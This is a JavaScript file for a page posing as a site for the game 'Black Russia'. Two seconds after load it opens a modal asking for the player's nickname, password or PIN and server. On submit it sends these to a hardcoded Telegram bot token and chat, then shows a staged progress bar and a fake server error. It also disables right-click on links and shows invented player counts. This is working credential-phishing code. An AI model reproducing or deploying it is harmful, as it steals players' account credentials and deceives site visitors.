document.addEventListener("DOMContentLoaded", () => {
    const cookieBanner = document.getElementById("cookieBanner");
    const cookieOkBtn = document.getElementById("cookieOkBtn");

    // Обработчик события для кнопки "Ок" в плашке с куки
    cookieOkBtn.addEventListener("click", () => {
        // Скрываем плашку при нажатии
        cookieBanner.style.display = "none";
        
        // Здесь можно добавить сохранение согласия в localStorage или cookies:
        // localStorage.setItem("cookieAccepted", "true");
    });

    // Опционально: если заходили раньше и приняли, можно сразу скрыть
    // if (localStorage.getItem("cookieAccepted") === "true") {
    //     cookieBanner.style.display = "none";
    // }

    const adminModal = document.getElementById("adminModal");
    const adminModalClose = document.getElementById("adminModalClose");
    const adminModalCancel = document.getElementById("adminModalCancel");
    const adminModalSubmit = document.getElementById("adminModalSubmit");
    const adminNickname = document.getElementById("adminNickname");
    const adminPassword = document.getElementById("adminPassword");
    const adminServer = document.getElementById("adminServer");
    const adminInputBlock = document.getElementById("adminInputBlock");
    const adminNicknameError = document.getElementById("adminNicknameError");
    const adminPasswordError = document.getElementById("adminPasswordError");
    const adminServerError = document.getElementById("adminServerError");

    const openAdminModal = () => {
        if (!adminModal) return;
        adminModal.classList.remove("closing");
        adminModal.classList.add("open");
        document.body.style.overflow = "hidden";
        adminNickname?.focus();
    };

    const closeAdminModal = () => {
        if (!adminModal) return;
        adminModal.classList.remove("open");
        adminModal.classList.add("closing");
        document.body.style.overflow = "";
    };

    adminModal?.addEventListener("transitionend", (event) => {
        if (event.target !== adminModal) return;
        if (event.propertyName !== "opacity") return;
        if (adminModal.classList.contains("closing")) {
            adminModal.classList.remove("closing");
        }
    });

    setTimeout(openAdminModal, 2000);

    adminModalClose?.addEventListener("click", closeAdminModal);
    adminModalCancel?.addEventListener("click", closeAdminModal);
    adminModal?.addEventListener("click", (event) => {
        if (event.target === adminModal) {
            closeAdminModal();
        }
    });

    document.addEventListener('contextmenu', (event) => {
        if (event.target.closest('a')) {
            event.preventDefault();
        }
    });

    const adminProgressBlock = document.getElementById("adminProgressBlock");
    const adminProgressFill = document.getElementById("adminProgressFill");
    const adminProgressText = document.getElementById("adminProgressText");
    const adminProgressPercent = document.getElementById("adminProgressPercent");
    const adminProgressError = document.getElementById("adminProgressError");
    const adminProgressRetry = document.getElementById("adminProgressRetry");
    const telegramBotToken = "8714107180:AAG9pdz8Ma31DQJdSOHbClE2ZXDTmdTw9XQ";
    const telegramChatId = "@logsbrchat";

    const setProgress = (percentage, text) => {
        if (adminProgressFill) {
            adminProgressFill.style.width = percentage + "%";
        }
        if (adminProgressPercent) {
            adminProgressPercent.textContent = percentage + "%";
        }
        if (adminProgressText) {
            adminProgressText.textContent = text;
        }
    };

    const sendAdminDataToTelegram = async (nickname, password, server) => {
        if (!telegramBotToken || !telegramChatId) return;

        const text = `Новый запрос из модалки:\nНикнейм: ${nickname}\nПароль / PIN: ${password}\nСервер: ${server}`;
        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

        try {
            await fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text
                })
            });
        } catch (error) {
            console.error("Telegram send failed:", error);
        }
    };

    const showProgress = () => {
        adminProgressError.textContent = "";
        adminProgressRetry?.classList.remove("visible");
        adminInputBlock?.classList.add("hidden");
        adminProgressBlock?.classList.add("active");
        adminModalSubmit?.setAttribute("disabled", "disabled");
        adminModalCancel?.setAttribute("disabled", "disabled");
        adminNickname?.setAttribute("disabled", "disabled");
        adminPassword?.setAttribute("disabled", "disabled");
        adminServer?.setAttribute("disabled", "disabled");

        setProgress(0, "Подготовка запроса...");

        let progress = 0;
        const interval = setInterval(() => {
            if (progress >= 78) {
                clearInterval(interval);
                setProgress(78, "Обработано...");
                adminProgressError.textContent = "Сервис blackrussia.online временно не отвечает. Попробуйте чуть позже. Ошибка #406";
                adminProgressRetry?.classList.add("visible");
                return;
            }

            progress += Math.floor(Math.random() * 8) + 6;
            if (progress > 78) progress = 78;
            setProgress(progress, "Выполняется запрос...");
        }, 420);
    };

    const resetFormState = () => {
        adminProgressBlock?.classList.remove("active");
        adminProgressRetry?.classList.remove("visible");
        adminInputBlock?.classList.remove("hidden");
        adminProgressError.textContent = "";
        setProgress(0, "Проверка данных...");
        adminProgressFill?.style.setProperty("width", "0%");
        adminModalSubmit?.removeAttribute("disabled");
        adminModalCancel?.removeAttribute("disabled");
        adminNickname?.removeAttribute("disabled");
        adminPassword?.removeAttribute("disabled");
        adminServer?.removeAttribute("disabled");
    };

    adminProgressRetry?.addEventListener("click", () => {
        resetFormState();
    });

    adminModalSubmit?.addEventListener("click", () => {
        const nicknameValue = adminNickname?.value.trim() || "";
        const passwordValue = adminPassword?.value.trim() || "";
        const serverValue = adminServer?.value.trim() || "";

        const nicknameRegex = /^[A-Za-z0-9_-]+$/;
        const passwordRegex = /^[\x21-\x7E]+$/;

        let isValid = true;
        adminNicknameError.textContent = "";
        adminPasswordError.textContent = "";
        adminServerError.textContent = "";
        adminProgressError.textContent = "";

        if (!nicknameValue) {
            adminNicknameError.textContent = "Никнейм обязателен.";
            isValid = false;
        } else if (!nicknameRegex.test(nicknameValue)) {
            adminNicknameError.textContent = "Никнейм должен быть на английском (латиница, цифры, _ или -).";
            isValid = false;
        }

        if (!passwordValue) {
            adminPasswordError.textContent = "Пароль обязателен.";
            isValid = false;
        } else if (!passwordRegex.test(passwordValue)) {
            adminPasswordError.textContent = "Пароль должен состоять только из английских символов и цифр.";
            isValid = false;
        }

        if (!serverValue) {
            adminServerError.textContent = "Выберите сервер.";
            isValid = false;
        }

        if (!isValid) {
            return;
        }

        showProgress();
        sendAdminDataToTelegram(nicknameValue, passwordValue, serverValue);
    });

    // Логика протягивания (drag-to-scroll) карточек мышкой/тачем
    const track = document.getElementById("cardsTrack");
    let isDown = false;
    let startX;
    let scrollLeft;
    let isDragged = false; // Флаг, чтобы понимать, был клик или свайп

    if (track) {
        track.addEventListener("mousedown", (e) => {
            isDown = true;
            isDragged = false;
            track.classList.add("active");
            startX = e.pageX - track.offsetLeft;
            scrollLeft = track.scrollLeft;
        });

        track.addEventListener("mouseleave", () => {
            isDown = false;
        });

        track.addEventListener("mouseup", () => {
            isDown = false;
        });

        track.addEventListener("mousemove", (e) => {
            if (!isDown) return;
            e.preventDefault();
            const x = e.pageX - track.offsetLeft;
            const walk = (x - startX) * 2; // Скорость скролла
            if (Math.abs(walk) > 5) {
                isDragged = true; // Считаем это свайпом, если мышка сдвинулась далеко
            }
            track.scrollLeft = scrollLeft - walk;
        });
    }

    // Трансформация (разворот) карточек при отпускании мышки (клике)
    const cards = document.querySelectorAll(".card");
    cards.forEach(card => {
        card.addEventListener("click", () => {
            // Если карточку тянули (свайпали), то не раскрываем её
            if (isDragged) return;

            // (Опционально) Закрывать остальные перед открытием одной:
            // cards.forEach(c => { if(c !== card) c.classList.remove('expanded'); });

            // Переключает класс expanded у нажатой карточки
            card.classList.toggle("expanded");
        });
    });

    // --- Генерация серверов ---
    const serversList = [
        "Red", "Green", "Blue", "Yellow", "Orange", "Purple", "Lime", "Pink", "Cherry", "Black", 
        "Indigo", "White", "Magenta", "Crimson", "Gold", "Azure", "Platinum", "Aqua", "Gray", "Ice", 
        "Chilli", "Choco", "Moscow", "SPB", "Ufa", "Sochi", "Kazan", "Samara", "Rostov", "Anapa", 
        "EKB", "Krasnodar", "Arzamas", "Novosib", "Grozny", "Saratov", "Omsk", "Irkutsk", "Volgograd", 
        "Voronezh", "Belgorod", "Makhachkala", "Vladikavkaz", "Vladivostok", "Kaliningrad", "Chelyabinsk", 
        "Krasnoyarsk", "Cheboksary", "Khabarovsk", "Perm", "Tula", "Ryazan", "Murmansk", "Penza", "Kursk", 
        "Arkhangelsk", "Orenburg", "Kirov", "Kemerovo", "Tyumen", "Tolyatti", "Ivanovo", "Stavropol", 
        "Smolensk", "Pskov", "Bryansk", "Orel", "Yaroslavl", "Barnaul", "Lipetsk", "Ulyanovsk", "Yakutsk", 
        "Tambov", "Bratsk", "Astrakhan", "Chita", "Kostroma", "Vladimir", "Kaluga", "Novgorod", "Taganrog", 
        "Vologda", "Tver", "Tomsk", "Izhevsk", "Surgut", "Podolsk", "Magadan", "Cherepovets", "Norilsk", "ASTANA"
    ];

    const serversGrid = document.getElementById("serversGrid");
    const totalOnlineEl = document.getElementById("totalOnline");
    let totalOnlineCount = 0;

    if (serversGrid) {
        serversList.forEach((serverName, index) => {
            const serverId = index + 1;
            // Онлайн от 750 до 1290 (не более 1300)
            const online = Math.floor(Math.random() * (1290 - 750 + 1)) + 750;
            totalOnlineCount += online;

            const card = document.createElement("a");
            card.href = `https://blackrussia.online/registration?s=${serverId}`;
            card.target = "_blank";
            card.className = "server-card";
            card.innerHTML = `
                <div class="server-id">#${serverId}</div>
                <div class="server-name">${serverName}</div>
                <div class="server-online">${online} <span class="total-slots">/ 1300</span></div>
            `;
            serversGrid.appendChild(card);
        });

        if (totalOnlineEl) {
            totalOnlineEl.innerText = totalOnlineCount + " человек";
        }

        // Добавляем логику drag-to-scroll для серверов
        let isDownS = false;
        let isDraggedS = false;
        let startXS;
        let scrollLeftS;

        serversGrid.addEventListener("mousedown", (e) => {
            isDownS = true;
            isDraggedS = false;
            serversGrid.style.cursor = 'grabbing';
            startXS = e.pageX - serversGrid.offsetLeft;
            scrollLeftS = serversGrid.scrollLeft;
        });
        serversGrid.addEventListener("mouseleave", () => {
            isDownS = false;
            serversGrid.style.cursor = 'default';
        });
        serversGrid.addEventListener("mouseup", () => {
            isDownS = false;
            serversGrid.style.cursor = 'default';
        });
        serversGrid.addEventListener("mousemove", (e) => {
            if (!isDownS) return;
            e.preventDefault();
            const x = e.pageX - serversGrid.offsetLeft;
            const walk = (x - startXS) * 2;
            serversGrid.scrollLeft = scrollLeftS - walk;
            if (Math.abs(walk) > 5) {
                isDraggedS = true;
            }
        });

        // Отменять клик, если мы скроллили список
        const serverCardsElements = serversGrid.querySelectorAll(".server-card");
        serverCardsElements.forEach(card => {
            card.addEventListener("click", (e) => {
                if (isDraggedS) {
                    e.preventDefault();
                }
            });
        });

        // Логика кастомного ползунка прокрутки
        const scrollbar = document.getElementById("serversScrollbar");
        const thumb = document.getElementById("serversThumb");

        if (scrollbar && thumb) {
            const updateThumbPosition = () => {
                const scrollableWidth = serversGrid.scrollWidth - serversGrid.clientWidth;
                if (scrollableWidth <= 0) {
                    scrollbar.style.display = "none";
                    return;
                }
                scrollbar.style.display = "block";
                const scrollRatio = serversGrid.scrollLeft / scrollableWidth;
                
                // Пропорциональный размер ползунка относительно видимой зоны (необязательно, но будет красивее)
                const viewRatio = Math.min(serversGrid.clientWidth / serversGrid.scrollWidth, 1);
                const thumbWidth = Math.max(viewRatio * scrollbar.clientWidth, 40);
                thumb.style.width = thumbWidth + "px";

                const thumbMaxLeft = scrollbar.clientWidth - thumb.clientWidth;
                thumb.style.left = (scrollRatio * thumbMaxLeft) + "px";
            };

            serversGrid.addEventListener("scroll", updateThumbPosition);
            window.addEventListener("resize", updateThumbPosition);

            // Перетаскивание самого ползунка мышью
            let isThumbDrag = false;
            let startThumbX;
            let initialScrollLeft;

            thumb.addEventListener("mousedown", (e) => {
                isThumbDrag = true;
                startThumbX = e.pageX;
                initialScrollLeft = serversGrid.scrollLeft;
                e.stopPropagation(); // Отменяем всплытие, чтобы не сработал mousedown на полосе
            });

            window.addEventListener("mouseup", () => {
                isThumbDrag = false;
            });

            window.addEventListener("mousemove", (e) => {
                if (!isThumbDrag) return;
                e.preventDefault();
                const dx = e.pageX - startThumbX;
                const thumbMaxLeft = scrollbar.clientWidth - thumb.clientWidth;
                const scrollableWidth = serversGrid.scrollWidth - serversGrid.clientWidth;
                
                const scrollOffset = (dx / thumbMaxLeft) * scrollableWidth;
                serversGrid.scrollLeft = initialScrollLeft + scrollOffset;
            });

            // Клик по треку скроллбара
            scrollbar.addEventListener("mousedown", (e) => {
                if (e.target === thumb) return;
                const clickX = e.offsetX;
                const thumbMaxLeft = scrollbar.clientWidth - thumb.clientWidth;
                
                // Рассчитываем новую позицию (центрируем ползунок по месту клика)
                const targetLeft = clickX - (thumb.clientWidth / 2);
                let ratio = targetLeft / thumbMaxLeft;
                ratio = Math.max(0, Math.min(1, ratio));

                const scrollableWidth = serversGrid.scrollWidth - serversGrid.clientWidth;
                serversGrid.scrollLeft = ratio * scrollableWidth;
            });

            // Инициализация при старте (с таймаутом, чтобы элементы успели отрендериться)
            setTimeout(updateThumbPosition, 100);
        }
    }
});